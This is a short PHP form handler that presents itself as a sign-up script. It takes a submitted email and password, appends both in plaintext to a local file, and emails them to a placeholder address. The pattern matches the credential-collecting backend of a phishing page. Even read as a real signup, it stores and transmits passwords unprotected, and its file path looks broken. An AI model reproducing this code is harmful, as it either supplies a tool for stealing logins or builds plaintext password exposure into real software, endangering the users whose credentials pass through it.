<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validate and store data
    if (!empty($email) && !empty($password)) {
        $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";
        $filePath = "F:\sdf\php"; // Specify the full path
        file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
        
        // Send email
        $to = "your@email.com"; // Replace with your email address
        $subject = "New Sign-Up";
        $message = "Email: $email\nPassword: $password";

        // Additional headers
        $headers = "From: webmaster@example.com"; // Replace with your email or leave it blank

        // Send the email
        mail($to, $subject, $message, $headers);

        echo "Sign up successful! An email has been sent to $to.";
    } else {
        echo "Please fill in all fields.";
    }
} else {
    echo "Invalid request method.";
}
?>
